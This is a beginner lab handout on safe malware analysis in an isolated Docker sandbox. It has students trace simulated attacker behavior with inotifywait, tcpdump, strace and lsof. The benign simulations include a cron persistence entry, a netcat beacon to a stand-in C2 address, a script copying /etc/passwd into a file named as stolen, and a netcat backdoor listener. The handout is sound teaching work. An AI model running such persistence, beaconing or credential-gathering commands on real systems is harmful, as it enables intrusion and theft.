# Lab 10 — Malware Sandbox: Safe Behavior Analysis

**Course:** SCIA-120 · Introduction to Secure Computing  
**Topic:** Malware — Types, Analysis & Defense  
**Difficulty:** ⭐⭐ Beginner–Intermediate  
**Estimated Time:** 45–60 minutes  
**Related Reading:** Chapter 5 — Malware: Types, Analysis, and Defense

---

## Overview

Security analysts need a safe way to observe what malware does without risking their real systems. A **sandbox** is an isolated environment that lets you run suspicious software and watch its behavior — what files it creates, what network connections it makes, what processes it spawns. In this lab you will use Docker as a malware sandbox to observe the typical behaviors of malicious scripts safely.

---

!!! warning "Educational Purpose"
    In this lab you will simulate malware behaviors using benign scripts. No real malware is used. All activity is contained within isolated Docker containers. This lab demonstrates *what malware does* so you can recognize and defend against it.

---

## Learning Objectives

1. Explain what a sandbox environment is and why it is used for malware analysis.
2. Observe and document file system changes caused by a suspicious script.
3. Observe network connection attempts from malicious-style behavior.
4. Use `strace` to trace system calls made by a process.
5. Use Docker isolation to prevent "malware" from affecting the host.

---

## Prerequisites

- Docker Desktop installed and running.

---

## Part 1 — Setting Up the Sandbox

A good sandbox is:
- **Isolated** — no network access to real systems
- **Monitored** — all activity logged
- **Disposable** — can be destroyed after analysis

### Step 1.1 — Create an Isolated Network (No Internet Access)

```bash
docker network create --internal malware-sandbox
```

The `--internal` flag means containers on this network **cannot reach the internet**.

### Step 1.2 — Start the Sandbox Container with Monitoring Tools

```bash
docker run -d \
  --name sandbox \
  --network malware-sandbox \
  --cap-add SYS_PTRACE \
  --security-opt seccomp=unconfined \
  ubuntu:22.04 sleep 3600
```

### Step 1.3 — Install Monitoring Tools

```bash
docker exec -it sandbox bash -c "
apt-get update -qq && apt-get install -y -qq \
  strace inotify-tools netcat-openbsd curl tcpdump procps lsof 2>/dev/null
echo 'Monitoring tools ready.'
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the monitoring tools installed successfully.

---

## Part 2 — Monitoring File System Changes

Malware commonly creates persistence files, drops payloads, or modifies configuration files.

### Step 2.1 — Start the Filesystem Monitor

In **Terminal 1**:

```bash
docker exec -it sandbox bash -c "
inotifywait -m -r /tmp /etc /home -e create,modify,delete,moved_to 2>/dev/null
"
```

Leave this running.

### Step 2.2 — Simulate Malware Writing Files

In **Terminal 2**, simulate a script that writes a persistence mechanism:

```bash
docker exec sandbox bash -c "
# Simulate: malware drops a payload
echo '#!/bin/bash
# simulated payload - benign' > /tmp/.hidden_payload

# Simulate: adds itself to cron
echo '* * * * * root /tmp/.hidden_payload' >> /etc/cron.d/malware_persist 2>/dev/null || true

# Simulate: creates a hidden config
mkdir -p /tmp/.config && echo 'c2&c_server=192.168.1.100' > /tmp/.config/settings

# Simulate: writes to multiple locations
cp /tmp/.hidden_payload /tmp/update_service
chmod +x /tmp/update_service
"
```

**Observe Terminal 1:** Every file creation and modification is logged in real time.

📸 **Screenshot checkpoint:** Take a screenshot of the inotifywait output showing all file events created by the simulated malware.

---

## Part 3 — Monitoring Network Connections

Malware typically "calls home" to a Command and Control (C2) server after infection.

### Step 3.1 — Monitor Network Activity

In **Terminal 1**, replace inotifywait with:

```bash
docker exec -it sandbox bash -c "
tcpdump -i eth0 -n 2>/dev/null &
echo 'Network monitoring started'
sleep 1
"
```

### Step 3.2 — Simulate C2 Beacon Behavior

In **Terminal 2**:

```bash
docker exec sandbox bash -c "
# Simulate: malware tries to connect home (will fail - internal network)
for i in 1 2 3; do
    echo 'BEACON: host=infected-pc id=abc123' | nc -w 1 10.10.10.10 4444 2>/dev/null || true
    echo 'Connection attempt \$i to C2 server failed (network isolated)'
    sleep 1
done

# Simulate: DNS lookup (C2 domain)
cat /etc/resolv.conf | grep nameserver
nslookup evil-c2-domain.example.com 2>/dev/null || echo 'DNS lookup blocked (isolated)'
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the network connection attempts and their failure (proving the sandbox isolation works).

---

## Part 4 — System Call Tracing with strace

`strace` shows every **system call** a process makes — opening files, network connections, process spawning, etc. Analysts use this to understand exactly what a binary does.

### Step 4.1 — Trace a Suspicious Script

Create the script to analyze:

```bash
docker exec sandbox bash -c "
cat > /tmp/suspicious.sh << 'SCRIPT'
#!/bin/bash
# Simulated suspicious script behavior
echo \"\$(hostname):\$(whoami):\$(id)\" > /tmp/victim_info.txt
cat /etc/passwd > /tmp/stolen_accounts.txt
ls -la /root/ 2>/dev/null > /tmp/root_listing.txt
echo \"Exfil: \$(cat /tmp/victim_info.txt)\" 
SCRIPT
chmod +x /tmp/suspicious.sh
"
```

### Step 4.2 — Run with strace

```bash
docker exec -it sandbox bash -c "
strace -e trace=openat,read,write,execve /tmp/suspicious.sh 2>&1 | head -40
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the strace output with system calls like `openat` (file access) and `write`.

### Step 4.3 — Check What Files Were Created

```bash
docker exec sandbox bash -c "
echo '=== Files dropped by suspicious script ==='
ls -la /tmp/*.txt
echo '=== Contents ==='
cat /tmp/victim_info.txt
echo '--- (passwd file would contain accounts) ---'
wc -l /tmp/stolen_accounts.txt
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the reconnaissance data collected by the script.

---

## Part 5 — Process Analysis

### Step 5.1 — Simulate a Running Backdoor Process

```bash
docker exec sandbox bash -c "
# Simulate a backdoor listening on a port
nc -l -p 9999 &
echo \"Backdoor PID: \$!\"
"
```

### Step 5.2 — Find Suspicious Listening Ports

```bash
docker exec sandbox bash -c "
echo '=== Listening network services ==='
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo ''
echo '=== Open files by process ==='
lsof -i TCP 2>/dev/null | head -20
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the backdoor listening on port 9999.

---

## Part 6 — Destroy the Infected Sandbox

A key advantage of Docker sandboxing: when you're done analyzing, you simply destroy the container. The host is unaffected.

```bash
docker stop sandbox && docker rm sandbox
docker network rm malware-sandbox
docker ps -a   # Confirm container is gone
```

📸 **Screenshot checkpoint:** Take a screenshot confirming the container has been removed.

---

## Cleanup

```bash
docker system prune -f
```

---

## Lab Assessment

### Screenshot Submission Checklist

- [ ] `screenshot-10a` — Monitoring tools installed
- [ ] `screenshot-10b` — inotifywait output showing file events
- [ ] `screenshot-10c` — Network connection attempts failing (sandbox isolation)
- [ ] `screenshot-10d` — strace system call output
- [ ] `screenshot-10e` — Files created by the suspicious script
- [ ] `screenshot-10f` — Backdoor process listening on port 9999
- [ ] `screenshot-10g` — Sandbox container destroyed (clean state)

### Reflection Questions

1. What is a **malware sandbox** and why is it important that it is isolated from the rest of the network? What could go wrong without isolation?
2. In Part 2, the simulated malware wrote a file to `/etc/cron.d/`. Why would real malware want to modify cron? What is this technique called?
3. What information did the simulated script collect in Part 4? If this were real malware, who might this data be valuable to and how might it be used?
4. You observe a process making repeated outbound connection attempts to the same IP address on port 4444 at regular intervals (every 60 seconds). What does this behavior suggest? What is the security term for this?

---

!!! tip "Grading Rubric"
    - Screenshots complete and clearly labeled: **40 points**  
    - Malware behavior observations written alongside each screenshot: **20 points**  
    - Reflection questions answered thoughtfully: **40 points**  
    - **Total: 100 points**
